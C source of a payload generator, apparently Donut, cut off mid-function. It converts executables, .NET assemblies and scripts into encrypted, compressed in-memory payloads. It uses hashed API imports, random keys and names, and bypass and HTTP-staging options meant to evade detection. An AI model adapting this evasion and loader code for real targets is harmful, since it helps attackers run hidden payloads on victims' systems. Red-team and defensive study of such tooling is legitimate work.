/**
  BSD 3-Clause License

  Copyright (c) 2019-2020, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"

#include "loader_exe_x86.h"
#include "loader_exe_x64.h"
  
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
 
// required for each API used by the loader
#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
 
// These must be in the same order as the DONUT_INSTANCE structure defined in donut.h
static API_IMPORT api_imports[] = { 
  {KERNEL32_DLL, "LoadLibraryA"},
  {KERNEL32_DLL, "GetProcAddress"},
  {KERNEL32_DLL, "GetModuleHandleA"},
  {KERNEL32_DLL, "Sleep"},
  {KERNEL32_DLL, "MultiByteToWideChar"},
  {KERNEL32_DLL, "GetUserDefaultLCID"},
  {KERNEL32_DLL, "CreateThread"},
  {KERNEL32_DLL, "CreateFileA"},
  {KERNEL32_DLL, "GetCurrentThread"},
  {KERNEL32_DLL, "GetCurrentProcess"},
  {KERNEL32_DLL, "GetCommandLineA"},
  {KERNEL32_DLL, "GetCommandLineW"},
  {KERNEL32_DLL, "HeapAlloc"},
  {KERNEL32_DLL, "HeapReAlloc"},
  {KERNEL32_DLL, "GetProcessHeap"},
  {KERNEL32_DLL, "HeapFree"},
  {KERNEL32_DLL, "GetLastError"},
        
  {SHELL32_DLL,  "CommandLineToArgvW"},
  
  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SafeArrayGetLBound"},
  {OLEAUT32_DLL, "SafeArrayGetUBound"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  {OLEAUT32_DLL, "LoadTypeLib"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetQueryDataAvailable"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  {MSCOREE_DLL,  "CorBindToRuntime"},
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {OLE32_DLL,    "CoInitializeEx"},
  {OLE32_DLL,    "CoCreateInstance"},
  {OLE32_DLL,    "CoUninitialize"},

  {NTDLL_DLL,    "RtlEqualUnicodeString"},
  {NTDLL_DLL,    "RtlEqualString"},
  {NTDLL_DLL,    "RtlUnicodeStringToAnsiString"},
  {NTDLL_DLL,    "RtlInitUnicodeString"},
  {NTDLL_DLL,    "RtlExitUserThread"},
  {NTDLL_DLL,    "RtlExitUserProcess"},
  {NTDLL_DLL,    "RtlCreateUnicodeString"},
  {NTDLL_DLL,    "RtlGetCompressionWorkSpaceSize"},
  {NTDLL_DLL,    "RtlDecompressBuffer"},
  {KERNEL32_DLL, "AddVectoredExceptionHandler"},
  {KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
  //{NTDLL_DLL,    "RtlFreeUnicodeString"},
  //{NTDLL_DLL,    "RtlFreeString"},
  
  { NULL, NULL }   // last one always contains two NULL pointers
};

// required to load .NET assemblies
static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
// required to load VBS and JS files
static GUID xIID_IUnknown = {
  0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IDispatch = {
  0x00020400, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IHost  = { 
  0x91afbd1b, 0x5feb, 0x43f5, {0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec}};
  
static GUID xIID_IActiveScript = {
  0xbb1a2ae1, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSite = {
  0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSiteWindow = {
  0xd10f6761, 0x83e9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};
  
static GUID xIID_IActiveScriptParse32 = {
  0xbb1a2ae2, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptParse64 = {
  0xc7ef7658, 0xe1ee, 0x480e, {0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17}};

static GUID xCLSID_VBScript = {
  0xB54F3741, 0x5B07, 0x11cf, {0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8}};

static GUID xCLSID_JScript  = {
  0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};

// where to store information about input file
file_info fi;

// return pointer to DOS header
static PIMAGE_DOS_HEADER DosHdr(void *map) {
    return (PIMAGE_DOS_HEADER)map;
}

// return pointer to NT headers
static PIMAGE_NT_HEADERS NtHdr (void *map) {
    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
}

// return pointer to File header
static PIMAGE_FILE_HEADER FileHdr (void *map) {
    return &NtHdr(map)->FileHeader;
}

// determines CPU architecture of binary
static int is32 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
}

// return pointer to Optional header
static void* OptHdr (void *map) {
    return (void*)&NtHdr(map)->OptionalHeader;
}

static PIMAGE_DATA_DIRECTORY Dirs (void *map) {
    if (is32(map)) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
    } else {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
    }
}

// valid dos header?
static int valid_dos_hdr (void *map) {
    PIMAGE_DOS_HEADER dos = DosHdr(map);
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    return (dos->e_lfanew != 0);
}

// valid nt headers
static int valid_nt_hdr (void *map) {
    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
}

static ULONG64 rva2ofs (void *base, ULONG64 rva) {
    DWORD                 i;
    ULONG64               ofs;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
      
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    sh  = (PIMAGE_SECTION_HEADER)
      ((PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    
    for (i=0; i<nt->FileHeader.NumberOfSections; i++) {      
      if ((rva >= sh[i].VirtualAddress) && 
          (rva < (sh[i].VirtualAddress + sh[i].SizeOfRawData))) {
          
        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
        return ofs;
      }
    }
    return -1;
}

#ifdef WINDOWS
#include "mmap-windows.c"
#endif

/**
 * Function: map_file
 * ----------------------------
 *   Open and map the contents of file into memory.
 *   
 *   INPUT  : path = file to map
 *       
 *   OUTPUT : Donut error code. 
 */
static int map_file(const char *path) {
    struct stat fs;

    DPRINT("Entering.");
    
    if(stat(path, &fs) != 0) {
      DPRINT("Unable to read size of file : %s", path);
      return DONUT_ERROR_FILE_NOT_FOUND;
    }
    
    if(fs.st_size == 0) {
      DPRINT("File appears to be empty!");
      return DONUT_ERROR_FILE_EMPTY;
    }
    
    fi.fd = open(path, O_RDONLY);
    
    if(fi.fd < 0) {
      DPRINT("Unable to open %s for reading.", path);
      return DONUT_ERROR_FILE_ACCESS;
    }
    
    fi.len = fs.st_size;
    
    fi.data = mmap(NULL, fi.len, PROT_READ, MAP_PRIVATE, fi.fd, 0);
    
    // no mapping? close file
    if(fi.data == NULL) {
      DPRINT("Unable to map file : %s", path);
      close(fi.fd);
      return DONUT_ERROR_NO_MEMORY;
    }
    return DONUT_ERROR_OK;
}

/**
 * Function: unmap_file
 * ----------------------------
 *   Releases memory allocated for file and closes descriptor.
 *
 *   INPUT  : Nothing
 *
 *   OUTPUT : Donut error code
 */
static int unmap_file(void) {
    
    if(fi.zdata != NULL) {
      DPRINT("Releasing compressed data.");
      free(fi.zdata);
      fi.zdata = NULL;
    }
    if(fi.data != NULL) {
      DPRINT("Unmapping input file.");
      munmap(fi.data, fi.len);    
      fi.data = NULL;
    }
    if(fi.fd != 0) {
      DPRINT("Closing input file.");
      close(fi.fd);
      fi.fd = 0;
    }
    return DONUT_ERROR_OK;
}

// only included for executable generator or debug build
#if defined(DONUT_EXE) || defined(DEBUG)
/**
 * Function: file_diff
 * ----------------------------
 *   Calculates the ratio between two lengths for compression and decompression.
 *
 *   INPUT  : new_len = new length
 *          : old_len = old length
 *
 *   OUTPUT : ratio as a percentage
 */
static uint32_t file_diff(uint32_t new_len, uint32_t old_len) {
    if (new_len <= UINT_MAX / 100) {
      new_len *= 100;
    } else {
      old_len /= 100;
    }
    if (old_len == 0) {
      old_len = 1;
    }
    return (100 - (new_len / old_len));
}
#endif

/**
 * Function: compress_file
 * ----------------------------
 *   Compresses the input file based on engine selected by user
 *
 *   INPUT  : Pointer to Donut configuration.
 *
 *   OUTPUT : Donut error code. 
 */
int compress_file(PDONUT_CONFIG c) {
    int err = DONUT_ERROR_OK;
    
    // RtlCompressBuffer is only available on Windows
    #ifdef WINDOWS
    typedef NTSTATUS (WINAPI *RtlGetCompressionWorkSpaceSize_t)(
      USHORT                 CompressionFormatAndEngine,
      PULONG                 CompressBufferWorkSpaceSize,
      PULONG                 CompressFragmentWorkSpaceSize);

    typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(
      USHORT                 CompressionFormatAndEngine,
      PUCHAR                 UncompressedBuffer,
      ULONG                  UncompressedBufferSize,
      PUCHAR                 CompressedBuffer,
      ULONG                  CompressedBufferSize,
      ULONG                  UncompressedChunkSize,
      PULONG                 FinalCompressedSize,
      PVOID                  WorkSpace);
    
    ULONG                            wspace, fspace;
    NTSTATUS                         nts;
    PVOID                            ws;
    HMODULE                          m;
    RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;
    RtlCompressBuffer_t              RtlCompressBuffer;
    
    // compress file using RtlCompressBuffer?
    if(c->compress == DONUT_COMPRESS_LZNT1  ||
       c->compress == DONUT_COMPRESS_XPRESS) 
    {
      m = GetModuleHandle("ntdll");
      RtlGetCompressionWorkSpaceSize = (RtlGetCompressionWorkSpaceSize_t)GetProcAddress(m, "RtlGetCompressionWorkSpaceSize");
      RtlCompressBuffer = (RtlCompressBuffer_t)GetProcAddress(m, "RtlCompressBuffer");
      
      if(RtlGetCompressionWorkSpaceSize == NULL || RtlCompressBuffer == NULL) {
        DPRINT("Unable to resolve compression API");
        return DONUT_ERROR_COMPRESSION;
      }
      
      DPRINT("Reading fragment and workspace size");
      nts = RtlGetCompressionWorkSpaceSize(
        (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
        &wspace, &fspace);
        
      if(nts == 0) {
        DPRINT("workspace size : %"PRId32" | fragment size : %"PRId32, wspace, fspace);
        ws = malloc(wspace); 
        if(ws != NULL) {
          DPRINT("Allocating memory for compressed data.");
          fi.zdata = malloc(fi.len);
          if(fi.zdata != NULL) {
            DPRINT("Compressing %p to %p with RtlCompressBuffer(%s)",
              fi.data, fi.zdata,
              c->compress == DONUT_COMPRESS_LZNT1  ? "LZNT" : "XPRESS");
            
            nts = RtlCompressBuffer(
              (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
              fi.data, fi.len, fi.zdata, fi.len, 0, 
              (PULONG)&fi.zlen, ws); 
            
            if(nts != 0) {
              DPRINT("NTSTATUS : %lx", nts);
              err = DONUT_ERROR_COMPRESSION;
            }
          } else err = DONUT_ERROR_NO_MEMORY;
          free(ws);
        } else err = DONUT_ERROR_NO_MEMORY;
      } else err = DONUT_ERROR_COMPRESSION;
    }
    #endif
    if(c->compress == DONUT_COMPRESS_APLIB) {
      DPRINT("Obtaining size of compressed data from aP_max_packed_size() and allocating memory");
      fi.zdata = malloc(aP_max_packed_size(fi.len));
      if(fi.zdata != NULL) {
        DPRINT("Obtaining size of work memory from aP_workmem_size() and allocating memory");
        uint8_t *workmem = malloc(aP_workmem_size(fi.len));
        if(workmem != NULL) {
          DPRINT("Compressing with aP_pack()");
          fi.zlen = aP_pack(fi.data, fi.zdata, fi.len, workmem, NULL, NULL);
        
          if(fi.zlen == APLIB_ERROR) err = DONUT_ERROR_COMPRESSION;
          free(workmem);
        } else err = DONUT_ERROR_NO_MEMORY;
      } else err = DONUT_ERROR_NO_MEMORY;
    }
    
    // if compression is specified
    if(err == DONUT_ERROR_OK && c->compress != DONUT_COMPRESS_NONE) {
      // set the compressed length in configuration
      c->zlen = fi.zlen;
      DPRINT("Original file size : %"PRId32 " | Compressed : %"PRId32, fi.len, fi.zlen);
      DPRINT("File size reduced by %"PRId32"%%", file_diff(fi.zlen, fi.len));
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: read_file_info
 * ----------------------------
 *   Reads information about the input file.
 *
 *   INPUT  : Pointer to Donut configuration.
 *
 *   OUTPUT : Donut error code.
 */
static int read_file_info(PDONUT_CONFIG c) {
    PIMAGE_NT_HEADERS                nt;    
    PIMAGE_DATA_DIRECTORY            dir;
    PMDSTORAGESIGNATURE              pss;
    PIMAGE_COR20_HEADER              cor;
    DWORD                            dll, rva, cpu;
    ULONG64                          ofs;
    PCHAR                            ext;
    int                              err = DONUT_ERROR_OK;

    DPRINT("Entering.");
    
    // invalid parameters passed?
    if(c->input[0] == 0) {
      DPRINT("No input file provided.");
      return DONUT_ERROR_INVALID_PARAMETER;
    }

    DPRINT("Checking extension of %s", c->input);
    ext = strrchr(c->input, '.');
    
    // no extension? exit
    if(ext == NULL) {
      DPRINT("Input file has no extension.");
      return DONUT_ERROR_FILE_INVALID;
    }
    DPRINT("Extension is \"%s\"", ext);

    // VBScript?
    if (strcasecmp(ext, ".vbs") == 0) {
      DPRINT("File is VBS");
      fi.type = DONUT_MODULE_VBS;
      fi.arch = DONUT_ARCH_ANY;
    } else 
    // JScript?
    if (strcasecmp(ext,  ".js") == 0) {
      DPRINT("File is JS");
      fi.type = DONUT_MODULE_JS;
      fi.arch = DONUT_ARCH_ANY;
    } else 
    // EXE?
    if (strcasecmp(ext, ".exe") == 0) {
      DPRINT("File is EXE");
      fi.type = DONUT_MODULE_EXE;
    } else
    // DLL?
    if (strcasecmp(ext, ".dll") == 0) {
      DPRINT("File is DLL");
      fi.type = DONUT_MODULE_DLL;
    } else {
      DPRINT("Don't recognize file extension.");
      return DONUT_ERROR_FILE_INVALID;
    }
    
    DPRINT("Mapping %s into memory", c->input);
    
    err = map_file(c->input);
    if(err != DONUT_ERROR_OK) return err;
    
    // file is EXE or DLL?
    if(fi.type == DONUT_MODULE_DLL ||
       fi.type == DONUT_MODULE_EXE)
    {
      if(!valid_dos_hdr(fi.data)) {
        DPRINT("EXE/DLL has no valid DOS header.");
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      
      if(!valid_nt_hdr(fi.data)) {
        DPRINT("EXE/DLL has no valid NT header.");
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }

      dir = Dirs(fi.data);
      
      if(dir == NULL) {
        DPRINT("EXE/DLL has no valid image directories.");
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking characteristics");
      
      nt  = NtHdr(fi.data);
      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
      cpu = is32(fi.data);
      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
      
      // set the CPU architecture for file
      fi.arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
      
      // if COM directory present
      if(rva != 0) {
        DPRINT("COM Directory found indicates .NET assembly.");
        
        // if it has an export address table, we assume it's a .NET
        // mixed assembly. curently unsupported by the PE loader.
        if(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
          DPRINT("File looks like a mixed (native and managed) assembly.");
          err = DONUT_ERROR_MIXED_ASSEMBLY;
          goto cleanup;
        } else {
          // set type to EXE or DLL assembly
          fi.type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
          
          // try read the runtime version from meta header
          strncpy(fi.ver, "v4.0.30319", DONUT_VER_LEN - 1);
          
          ofs = rva2ofs(fi.data, rva);
          if (ofs != -1) {
            cor = (PIMAGE_COR20_HEADER)(ofs + fi.data);
            rva = cor->MetaData.VirtualAddress;
            if(rva != 0) {
              ofs = rva2ofs(fi.data, rva);
              if(ofs != -1) {
                pss = (PMDSTORAGESIGNATURE)(ofs + fi.data);
                DPRINT("Runtime version : %s", (char*)pss->pVersion);
                strncpy(fi.ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);
              }
            }
          }
        }
      }
    }
    // assign length of file and type to configuration
    c->len      = fi.len;
    c->mod_type = fi.type;
cleanup:
    if(err != DONUT_ERROR_OK) {
      DPRINT("Unmapping input file due to errors.");
      unmap_file();
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: gen_random
 * ----------------------------
 *   Generates pseudo-random bytes.
 *
 *   INPUT  : buf = where to store random bytes.
 *          : len = length of random bytes to generate.
 *
 *   OUTPUT : 1 if ok, else 0
 */
static int gen_random(void *buf, uint64_t len) {
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    int      fd;
    uint64_t r=0;
    uint8_t  *p=(uint8_t*)buf;
    
    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);
    
    if(fd > 0) {
      for(r=0; r<len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    return r == len;
#endif
}

/**
 * Function: gen_random_string
 * ----------------------------
 *   Generates a pseudo-random string
 *
 *   INPUT  : output = pointer to buffer that receives string
 *          : len = length of string to generate
 *
 *   OUTPUT : 1 if ok, else 0  
 */
static int gen_random_string(void *output, uint64_t len) {
    uint8_t rnd[DONUT_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF";  // https://stackoverflow.com/a/27459196
    char    *str = (char*)output;
    
    if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;
    
    // generate DONUT_MAX_NAME random bytes
    if(!gen_random(rnd, DONUT_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i] = 0;
    return 1;
}

/**
 * Function: build_module
 * ----------------------------
 *   Create a Donut module from Donut configuration
 *
 *   INPUT  : A pointer to a donut configuration
 *
 *   OUTPUT : Donut error code. 
 */
static int build_module(PDONUT_CONFIG c) {
    PDONUT_MODULE mod     = NULL;
    uint32_t      mod_len, data_len;
    void          *data;
    int           err = DONUT_ERROR_OK;
    
    DPRINT("Entering.");
    
    // Compress the input file?
    if(c->compress != DONUT_COMPRESS_NONE) {
      err = compress_file(c);
      
      if(err != DONUT_ERROR_OK) {
        DPRINT("compress_file() failed");
        return err;
      }
      DPRINT("Assigning %"PRIi32 " bytes of %p to data", fi.zlen, fi.zdata);
      data     = fi.zdata;
      data_len = fi.zlen;
    } else {
      DPRINT("Assigning %"PRIi32 " bytes of %p to data", fi.len, fi.data);
      data     = fi.data;
      data_len = fi.len;
    }
    // Allocate memory for module information and contents of file
    mod_len = data_len + sizeof(DONUT_MODULE);
    
    DPRINT("Allocating %" PRIi32 " bytes of memory for DONUT_MODULE", mod_len);
    mod = calloc(mod_len, 1);

    // Memory not allocated? exit
    if(mod == NULL) {
      DPRINT("calloc() failed");
      return DONUT_ERROR_NO_MEMORY;
    }
    
    // Set the module info
    mod->type     = fi.type;
    mod->thread   = c->thread;
    mod->compress = c->compress;
    mod->unicode  = c->unicode;
    mod->zlen     = fi.zlen;
    mod->len      = fi.len;
    
    // DotNet assembly?
    if(mod->type == DONUT_MODULE_NET_DLL ||
       mod->type == DONUT_MODULE_NET_EXE)
    {
      // If no domain name specified in configuration
      if(c->domain[0] == 0) {
        // if entropy is enabled
        if(c->entropy != DONUT_ENTROPY_NONE) { 
          // generate a random name
          if(!gen_random_string(c->domain, DONUT_DOMAIN_LEN)) {
            DPRINT("gen_random_string() failed");
            err = DONUT_ERROR_RANDOM;
            goto cleanup;
          }
        }
      }
      DPRINT("Domain  : %s", c->domain[0] == 0 ? "Default" : c->domain);
      if(c->domain[0] != 0) {
        // Set the domain name in module
        strncpy(mod->domain, c->domain, DONUT_DOMAIN_LEN);
      } else {
        memset(mod->domain, 0, DONUT_DOMAIN_LEN);
      }
      // Assembly is DLL? Copy the class and method
      if(mod->type == DONUT_MODULE_NET_DLL) {
        DPRINT("Class   : %s", c->cls);
        strncpy(mod->cls, c->cls, DONUT_MAX_NAME-1);
        
        DPRINT("Method  : %s", c->method);
        strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
      }
      // If no runtime specified in configuration, use version from assembly
      if(c->runtime[0] == 0) {
        strncpy(c->runtime, fi.ver, DONUT_MAX_NAME-1);
      }
      DPRINT("Runtime : %s", c->runtime);
      strncpy(mod->runtime, c->runtime, DONUT_MAX_NAME-1);
    } else
    // Unmanaged DLL? copy function name to module          
    if(mod->type == DONUT_MODULE_DLL && c->method[0] != 0) {
      DPRINT("DLL function : %s", c->method);
      strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
    }
      
    // Parameters specified?
    if(c->args[0] != 0) {
      // If file type is unmanaged EXE
      if(mod->type == DONUT_MODULE_EXE) {
        // If entropy is disabled
        if(c->entropy == DONUT_ENTROPY_NONE) {
          // Set to "AAAA"
          memset(mod->args, 'A', 4);
        } else {
          // Generate 4-byte random name
          if(!gen_random_string(mod->args, 4)) {
            DPRINT("gen_random_string() failed");
            err = DONUT_ERROR_RANDOM;
            goto cleanup;
          }
        }
        // Add space
        mod->args[4] = ' ';
      }
      // 
      // Copy parameters 
      strncat(mod->args, c->args, DONUT_MAX_NAME-6);
    }    
    DPRINT("Copying data to module");
    
    memcpy(&mod->data, data, data_len);
    // update configuration with pointer to module
    c->mod     = mod;
    c->mod_len = mod_len;
cleanup:
    // if there was an error, free memory for module
    if(err != DONUT_ERROR_OK) {
      DPRINT("Releasing memory due to errors.");
      free(mod);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: build_instance
 * ----------------------------
 *   Creates the data necessary for main loader to execute VBS/JS/EXE/DLL files in memory.
 *
 *   INPUT  : Pointer to a Donut configuration.
 *
 *   OUTPUT : Donut error code. 
 */
static int build_instance(PDONUT_CONFIG c) {
    DONUT_CRYPT     inst_key, mod_key;
    PDONUT_INSTANCE inst = NULL;
    int             cnt, inst_len;
    uint64_t        dll_hash;
    int             err = DONUT_ERROR_OK;
    
    DPRINT("Entering.");
    
    // Allocate memory for the size of instance based on the type
    DPRINT("Allocating memory for instance");
    inst_len = sizeof(DONUT_INSTANCE);
    
    // if the module is embedded, add the size of module
    // that will be appended to the end of structure
    if(c->inst_type == DONUT_INSTANCE_EMBED) {
      DPRINT("The size of module is %" PRIi32 " bytes. " 
             "Adding to size of instance.", c->mod_len);
      inst_len += c->mod_len;
    }
    DPRINT("Total length of instance : %"PRIi32, inst_len);
    
    // allocate zero-initialized memory for instance
    inst = (PDONUT_INSTANCE)calloc(inst_len, 1);

    // Memory allocation failed? exit
    if(inst == NULL) {
      DPRINT("Memory allocation failed");
      return DONUT_ERROR_NO_MEMORY;
    }
    
    // set the length of instance and pointer to it in configuration
    c->inst        = inst;
    c->inst_len    = inst->len = inst_len;
    // set the type of instance we're creating
    inst->type     = c->inst_type;
    // indicate if we should call RtlExitUserProcess to terminate host process
    inst->exit_opt = c->exit_opt;
    // set the Original Entry Point
    inst->oep      = c->oep;
    // set the entropy level
    inst->entropy  = c->entropy;
    // set the bypass level
    inst->bypass   = c->bypass;
    // set the headers level
    inst->headers  = c->headers;
    // set the module length
    inst->mod_len  = c->mod_len;

    // encryption enabled?
    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
      DPRINT("Generating random key for instance");
      if(!gen_random(&inst_key, sizeof(DONUT_CRYPT))) {
        DPRINT("gen_random() failed");
        err = DONUT_ERROR_RANDOM;
        goto cleanup;
      }
      // copy local key to configuration
      memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
      
      DPRINT("Generating random key for module");
      if(!gen_random(&mod_key, sizeof(DONUT_CRYPT))) {
        DPRINT("gen_random() failed");
        err = DONUT_ERROR_RANDOM;
        goto cleanup;
      }
      // copy local key to configuration
      memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
      
      DPRINT("Generating random string to verify decryption");
      if(!gen_random_string(inst->sig, DONUT_SIG_LEN)) {
        DPRINT("gen_random() failed");
        err = DONUT_ERROR_RANDOM;
        goto cleanup;
      }
     
      DPRINT("Generating random IV for Maru hash");
      if(!gen_random(&inst->iv, MARU_IV_LEN)) {
        DPRINT("gen_random() failed");
        err = DONUT_ERROR_RANDOM;
        goto cleanup;
      }
    }

    DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
    
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, inst->iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %016" PRIX64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    
    DPRINT("Setting number of API to %" PRIi32, cnt);
    inst->api_cnt = cnt;
    
    DPRINT("Setting DLL names to %s", DLL_NAMES);
    strcpy(inst->dll_names, DLL_NAMES);
        
    // if module is .NET assembly
    if(c->mod_type == DONUT_MODULE_NET_DLL ||
       c->mod_type == DONUT_MODULE_NET_EXE)
    {
      DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");

